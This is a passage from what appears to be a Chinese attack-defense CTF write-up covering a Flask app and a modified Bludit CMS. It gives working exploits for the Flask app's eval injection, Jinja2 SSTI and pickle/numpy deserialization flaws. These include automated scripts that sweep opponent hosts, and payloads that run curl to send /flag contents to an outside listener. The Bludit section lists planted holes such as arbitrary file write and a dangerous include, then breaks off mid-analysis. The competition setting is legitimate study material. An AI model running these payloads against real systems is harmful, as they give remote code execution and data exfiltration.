as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="string">'5000'</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#我应该没在这上面动过</span></span><br></pre></td></tr></table></figure>
<p>这题的洞比较多也很明显，开场就打飞了，在这上面翻车的，也在这上面薅了不少分……</p>
<h4 id="1-内置后门"><a href="#1-内置后门" class="headerlink" title="1.内置后门"></a>1.内置后门</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">'/robots.txt'</span>,methods=[<span class="string">'GET'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, as_attachment=True)</span><br></pre></td></tr></table></figure>
<p>直接读flag文件到robots.txt文件了，所以直接访问/robots.txt就拿到flag了。</p>
<h4 id="2-代码拼接"><a href="#2-代码拼接" class="headerlink" title="2.代码拼接"></a>2.代码拼接</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span></span>(<span class="class"><span class="keyword">type</span>,<span class="title">str</span>)</span>:</span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span>%(<span class="class"><span class="keyword">type</span>,<span class="title">str</span>)</span></span><br><span class="line"><span class="class">    <span class="title">print</span>(<span class="params">retstr</span>)</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">eval</span>(<span class="params">retstr</span>)</span></span><br></pre></td></tr></table></figure>
<p>set_str在/message处进行了调用，其中变量str取值msg，只进行了简单的处理</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(msg)&gt;<span class="number">27</span>:</span><br><span class="line">    <span class="literal">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">msg = msg.<span class="built_in">replace</span>(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">msg = msg.<span class="built_in">replace</span>(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">retstr = set_str(type,msg)</span><br></pre></td></tr></table></figure>
<p>所以可以任意拼接代码，给msg赋值为</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="string">'+open('</span>/<span class="built_in">flag</span><span class="string">').read()+'</span></span><br></pre></td></tr></table></figure>
<p>触发eval，直接read读取flag</p>
<h4 id="3-SSTI"><a href="#3-SSTI" class="headerlink" title="3.SSTI"></a>3.SSTI</h4><figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">'/hello'</span>,methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def hello():</span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base<span class="number">64</span>.b<span class="number">64</span>decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja<span class="number">2</span>.from<span class="number">_</span>string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    <span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span> = False</span><br><span class="line">    <span class="keyword">return</span> render<span class="number">_</span>template(<span class="string">'hello.html'</span>, msg=data,<span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span>=<span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span>)</span><br></pre></td></tr></table></figure>
<p>数据接口为cookie中的username，取值后进行了一次base64解码，通过Jinja2.from_string(‘****’).render()来触发SSTI，不会的阔以参考：<a href="https://www.exploit-db.com/exploits/46386，我们在打的时候没回显，所以用的是反弹flag的方式，弹到本地然后再交，贴下payload" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46386，我们在打的时候没回显，所以用的是反弹flag的方式，弹到本地然后再交，贴下payload</a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(3,21):</span><br><span class="line">		try:</span><br><span class="line">			#payload = <span class="string">"system('cat /flag');"</span></span><br><span class="line">			Url =<span class="string">"http://10.0.%s.4:5000/hello"</span>% i </span><br><span class="line">			cookie = &#123;<span class="string">'username'</span>:<span class="string">'e3sgKCkuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzkzXS5fX2luaXRfXy5fX2dsb2JhbHNfX1sic3lzIl0ubW9kdWxlc1sib3MiXS5zeXN0ZW0oJ2N1cmwgImh0dHA6Ly8xMC4xMC4yLjIwNzozMDAxL2ZsYWciIC1kICIkKGNhdCAvZj8/PykiJykgfX0='</span>&#125;</span><br><span class="line">			#<span class="builtin-name">print</span> Url</span><br><span class="line">		<span class="built_in">	IP </span>= <span class="string">'10.0.%s.4'</span>% i</span><br><span class="line">			<span class="builtin-name">print</span> <span class="string">'Target:'</span> + IP</span><br><span class="line">			<span class="attribute">result</span>=requests.post(url=Url,cookies = cookie,<span class="attribute">timeout</span>=3)</span><br><span class="line">			<span class="string">''</span><span class="string">'flag=result.text</span></span><br><span class="line"><span class="string">			mat = re.compile(".*([0-9a-zA-Z]&#123;20&#125;).*")</span></span><br><span class="line"><span class="string">			flag = mat.findall(flag)[0]</span></span><br><span class="line"><span class="string">			print flag</span></span><br><span class="line"><span class="string">			submit_token(flag)'</span><span class="string">''</span></span><br><span class="line">			#submit_cookie(IP,flag)</span><br><span class="line">		except:</span><br><span class="line">			sleep(0.1)</span><br><span class="line">	sleep(200)</span><br></pre></td></tr></table></figure>
<p>本地起个服务接收并提交flag就行了</p>
<h4 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4.反序列化"></a>4.反序列化</h4><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">'/message'</span>,methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">def message():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.<span class="keyword">get</span>(<span class="string">'user'</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        except Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,留言成功'</span>%username)</span><br></pre></td></tr></table></figure>
<p>一个pickle的反序列化，没啥东西，直接贴下payload</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base<span class="number">64</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> exp(<span class="keyword">object</span>):</span><br><span class="line">    def <span class="number">__</span>reduce<span class="number">__</span>(self):</span><br><span class="line">        s = <span class="string">"""curl -F token=mEs8j1Dl -F flag=$(cat /flag) http://10.10.0.2/api/flag/submit"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line">post<span class="number">_</span>data = &#123;<span class="string">'msg'</span>:<span class="string">''</span>,<span class="string">'type'</span>:<span class="string">''</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">'user'</span>,base<span class="number">64</span>.b<span class="number">64</span>encode(s).decode()&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="number">__n</span>ame<span class="number">__</span> == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">        url = http:<span class="comment">//10.0.%s.4:5000/message"% i</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url = url, cookies = cookie,data = post<span class="number">_</span>data)</span><br><span class="line">        except:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>反序列化第二个点是numpy（我看的时候看版本挺新的，由于其触发主要还是pickle，所以这个点还是能够触发反序列化）</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">'/getvdot'</span>,methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">def getvdot():</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">GET</span>':</span></span><br><span class="line">        return render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">result</span> = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(<span class="keyword">result</span>)</span><br><span class="line">        return render_template(<span class="string">'getvdot.html'</span>,msg=<span class="keyword">result</span>,status=<span class="string">'向量点积'</span>)</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://j7ur8.github.io/WebBook/Python/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/Python/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        s = <span class="string">"""ls"""</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,) </span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    poc = pickle.dumps(e)</span><br><span class="line">    print(poc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.pkl'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(e, f)</span><br><span class="line"></span><br><span class="line">numpy.load(<span class="string">'1.pkl'</span>);</span><br></pre></td></tr></table></figure>
<p>把生成的1.pkl读出来直接赋值给matrix1，matrix2打就行了（感谢<strong>f1sh</strong>大师傅的指导），本地没环境，就不贴图了~</p>
<h2 id="0x02-OZero"><a href="#0x02-OZero" class="headerlink" title="0x02 OZero"></a>0x02 OZero</h2><p>这里先贴下场上的时候z3r0yu师傅对比后的分析日志，源码下载地址：<a href="https://github.com/bludit/bludit/releases" target="_blank" rel="noopener">https://github.com/bludit/bludit/releases</a></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">被修改的几个点</span><br><span class="line"><span class="number">1.</span> bl-kernel/site.class.php</span><br><span class="line"><span class="string">'dribbble'</span>=&gt;		<span class="string">''</span>,</span><br><span class="line"><span class="string">'customFields'</span>=&gt;	<span class="string">'&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> bl-kernel/pagex.class.php</span><br><span class="line"><span class="comment">// Returns the value from the field, false if the fields doesn't exists</span></span><br><span class="line"><span class="comment">// If you set the $option as TRUE, the function returns an array with all the values of the field</span></span><br><span class="line">public function custom(<span class="symbol">$</span>field, <span class="symbol">$</span><span class="keyword">options</span>=false)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="symbol">$</span><span class="keyword">options</span>) &#123;</span><br><span class="line">            return <span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field];</span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field][<span class="string">'value'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> bl-kernel/pages.class.php</span><br><span class="line">elseif (<span class="symbol">$</span>field==<span class="string">'custom'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'custom'</span>])) &#123;</span><br><span class="line">        global <span class="symbol">$</span>site;</span><br><span class="line">        <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">        foreach (<span class="symbol">$</span>args[<span class="string">'custom'</span>] as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValue) &#123;</span><br><span class="line">            <span class="symbol">$</span>html = Sanitize::html(<span class="symbol">$</span>customValue);</span><br><span class="line">            <span class="comment">// Store the custom field as defined type</span></span><br><span class="line">            settype(<span class="symbol">$</span>html, <span class="symbol">$</span>customFields[<span class="symbol">$</span>customField][<span class="string">'type'</span>]);</span><br><span class="line">            <span class="symbol">$</span>row[<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>html;</span><br><span class="line">        &#125;</span><br><span class="line">        unset(<span class="symbol">$</span>args[<span class="string">'custom'</span>]);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; elseif (<span class="symbol">$</span>field==<span class="string">'custom'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'custom'</span>])) &#123;</span><br><span class="line">        global <span class="symbol">$</span>site;</span><br><span class="line">        <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">        foreach (<span class="symbol">$</span>args[<span class="string">'custom'</span>] as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValue) &#123;</span><br><span class="line">            <span class="symbol">$</span>html = Sanitize::html(<span class="symbol">$</span>customValue);</span><br><span class="line">            <span class="comment">// Store the custom field as defined type</span></span><br><span class="line">            settype(<span class="symbol">$</span>html, <span class="symbol">$</span>customFields[<span class="symbol">$</span>customField][<span class="string">'type'</span>]);</span><br><span class="line">            <span class="symbol">$</span>row[<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>html;</span><br><span class="line">        &#125;</span><br><span class="line">        unset(<span class="symbol">$</span>args[<span class="string">'custom'</span>]);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert custom fields to all the pages in the database</span></span><br><span class="line"><span class="comment">// The structure for the custom fields need to be a valid JSON format</span></span><br><span class="line"><span class="comment">// The custom fields are incremental, this means the custom fields are never deleted</span></span><br><span class="line"><span class="comment">// The pages only store the value of the custom field, the structure of the custom fields are in the database site.php</span></span><br><span class="line">public function setCustomFields(<span class="symbol">$</span>fields)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="symbol">$</span>customFields = json_decode(<span class="symbol">$</span>fields, true);</span><br><span class="line">    <span class="keyword">if</span> (json_last_error() != JSON_ERROR_NONE) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach (<span class="symbol">$</span>this-&gt;db as <span class="symbol">$</span>pageKey=&gt;<span class="symbol">$</span>pageFields) &#123;</span><br><span class="line">        foreach (<span class="symbol">$</span>customFields as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValues) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isset(<span class="symbol">$</span>pageFields[<span class="string">'custom'</span>][<span class="symbol">$</span>customField])) &#123;</span><br><span class="line">                <span class="symbol">$</span>defaultValue = <span class="string">''</span>;</span><br><span class="line">                <span class="keyword">if</span> (isset(<span class="symbol">$</span>customValues[<span class="string">'default'</span>])) &#123;</span><br><span class="line">                    <span class="symbol">$</span>defaultValue = <span class="symbol">$</span>customValues[<span class="string">'default'</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="symbol">$</span>this-&gt;db[<span class="symbol">$</span>pageKey][<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>defaultValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span class="symbol">$</span>this-&gt;save();</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> bl-kernel/helpers/tcp.class.php</span><br><span class="line">file_put_contents可能存在任意写</span><br><span class="line">	public static function download(<span class="symbol">$</span>url, <span class="symbol">$</span>destination)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="symbol">$</span>data = self::http(<span class="symbol">$</span>url, <span class="symbol">$</span>method=<span class="string">'GET'</span>, <span class="symbol">$</span>verifySSL=true, <span class="symbol">$</span>timeOut=<span class="number">30</span>, <span class="symbol">$</span>followRedirections=true, <span class="symbol">$</span><span class="keyword">binary</span>=true, <span class="symbol">$</span>headers=false);</span><br><span class="line">		return file_put_contents(<span class="symbol">$</span>destination, <span class="symbol">$</span>data);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">疑似一个反序列化之后的任意文件写</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="symbol">$</span>this-&gt;filepath) &amp;&amp; isset(<span class="symbol">$</span>this-&gt;error_log))&#123; </span><br><span class="line">          file_put_contents(PATH_UPLOADS_PROFILES.<span class="symbol">$</span>this-&gt;filepath,<span class="symbol">$</span>this-&gt;error_log);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> bl-kernel/functions.php</span><br><span class="line">疑似可以触发上述的反序列化</span><br><span class="line"><span class="comment">// Check media</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$music</span> = $_GET['path'];</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="symbol">$</span>music))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!Sanitize::pathFile(<span class="symbol">$</span>music))&#123;</span><br><span class="line">        <span class="symbol">$</span>filename = basename(<span class="symbol">$</span>music);</span><br><span class="line">        TCP::download(<span class="symbol">$</span>music,PATH_UPLOADS_PROFILES.md5(<span class="symbol">$</span>filename).<span class="string">"."</span>.<span class="string">"avi"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built-in">Log</span>::<span class="keyword">set</span>(__METHOD__.LOG_SEP.<span class="string">'Media request in  '</span>.date(<span class="string">'Y-m-d'</span>), LOG_TYPE_INFO);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">比原代码多了对json的处理</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'customFields'</span>])) &#123;</span><br><span class="line">    <span class="comment">// Custom fields need to be JSON format valid, also the empty JSON need to be "&#123;&#125;"</span></span><br><span class="line">    json_decode(<span class="symbol">$</span>args[<span class="string">'customFields'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (json_last_error() != JSON_ERROR_NONE) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="symbol">$</span>pages-&gt;setCustomFields(<span class="symbol">$</span>args[<span class="string">'customFields'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果可以移动并重命名，说不定就可以利用和这个写shell</span><br><span class="line"><span class="comment">// Move the image to a proper place and rename</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$image</span> = $imageDir.$nextFilename;</span></span><br><span class="line">Filesystem::mv(<span class="symbol">$</span><span class="keyword">file</span>, <span class="symbol">$</span>image);</span><br><span class="line">chmod(<span class="symbol">$</span>image, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> tokenCSRF 被删除了，所以不需要兼顾token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> bl-kernel/boot/rules/<span class="number">60.</span>router.php</span><br><span class="line">此处的include获取可以配合errorlog来getshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="symbol">$</span>pageKey = explode(<span class="string">"/"</span>, <span class="symbol">$</span>pageKey);</span><br><span class="line">	foreach(<span class="symbol">$</span>pageKey as <span class="symbol">$</span>key)&#123;</span><br><span class="line">		<span class="keyword">if</span>(constant(<span class="symbol">$</span>key))</span><br><span class="line">			<span class="symbol">$</span>plugin .=constant(<span class="symbol">$</span>key);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="symbol">$</span>plugin .=<span class="string">"/"</span>.<span class="symbol">$</span>key;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="symbol">$</span>plugin = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,<span class="symbol">$</span>plugin);</span><br><span class="line">	<span class="keyword">if</span>(file_exists(<span class="symbol">$</span>plugin))&#123;</span><br><span class="line">		<span class="symbol">$</span>plugin = addslashes(<span class="symbol">$</span>plugin);</span><br><span class="line">		include <span class="symbol">$</span>plugin;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> bl-kernel/boot/init.php   此处的new TCP跟上面的反序列化有点暗示</span><br><span class="line">define(<span class="string">'DEBUG_MODE'</span>, TRUE);</span><br><span class="line"><span class="meta"><span class="meta-keyword">$https</span>      = new TCP();</span></span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> bl-kernel/admin/views/settings.php</span><br><span class="line">&lt;?php <span class="symbol">$</span>L-&gt;p(<span class="string">'Custom fields'</span>) ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> bl-kernel/admin/views/new-content.php</span><br><span class="line">&lt;?php <span class="keyword">if</span> (!empty(<span class="symbol">$</span>site-&gt;customFields())): ?&gt;</span><br><span class="line">&lt;a class=<span class="string">"nav-link"</span> id=<span class="string">"nav-custom-tab"</span> data-toggle=<span class="string">"tab"</span> href=<span class="string">"#nav-custom"</span> role=<span class="string">"tab"</span> aria-controls=<span class="string">"custom"</span>&gt;&lt;?php <span class="symbol">$</span>L-&gt;p(<span class="string">'Custom'</span>) ?&gt;&lt;/a&gt;</span><br><span class="line">&lt;?php endif ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php <span class="keyword">if</span> (!empty(<span class="symbol">$</span>site-&gt;customFields())): ?&gt;</span><br><span class="line">&lt;<span class="built-in">div</span> id=<span class="string">"nav-custom"</span> class=<span class="string">"tab-pane fade"</span> role=<span class="string">"tabpanel"</span> aria-labelledby=<span class="string">"custom-tab"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">    foreach(<span class="symbol">$</span>customFields as <span class="symbol">$</span>field=&gt;<span class="symbol">$</span><span class="keyword">options</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'type'</span>]==<span class="string">"string"</span>) &#123;</span><br><span class="line">            echo Bootstrap::formInputTextBlock(array(</span><br><span class="line">                <span class="string">'name'</span>=&gt;<span class="string">'custom['</span>.<span class="symbol">$</span>field.<span class="string">']'</span>,</span><br><span class="line">                <span class="string">'label'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'value'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'default'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'default'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'tip'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'placeholder'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>]:<span class="string">''</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125; elseif (<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'type'</span>]==<span class="string">"bool"</span>) &#123;</span><br><span class="line">            echo Bootstrap::formCheckbox(array(</span><br><span class="line">                <span class="string">'name'</span>=&gt;<span class="string">'custom['</span>.<span class="symbol">$</span>field.<span class="string">']'</span>,</span><br><span class="line">                <span class="string">'label'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'placeholder'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'checked'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'checked'</span>])?true:false),</span><br><span class="line">                <span class="string">'labelForCheckbox'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>]:<span class="string">''</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/<span class="built-in">div</span>&gt;</span><br><span class="line">&lt;?php endif ?&gt;</span><br></pre></td></tr></table></figure>
<p>这里分析三个漏洞（反序列化用文件操作应该是可以触发的），师傅们要是分析了其他的求贴一波文章。</p>
<h4 id="1-任意文件下载"><a href="#1-任意文件下载" class="headerlink" title="1.任意文件下载"></a>1.任意文件下载</h4><p>经过对比分析的，可以看到tcp.class.php文件中的download方法存在任意写的问题，即向某个url发送GET请求，将返回数据写入$destination变量值命令的文件中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bl-kernel/helpers/tcp.class.php</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url, $destination)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$data = <span class="keyword">self</span>::http($url, $method=<span class="string">'GET'</span>, $verifySSL=<span class="keyword">true</span>, $timeOut=<span class="number">30</span>, $followRedirections=<span class="keyword">true</span>, $binary=<span class="keyword">true</span>, $headers=<span class="keyword">false</span>);</span><br><span class="line">		<span class="keyword">return</span> file_put_contents($destination, $data);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>该方法在bl-kernel/function.php中进行了调用</p>
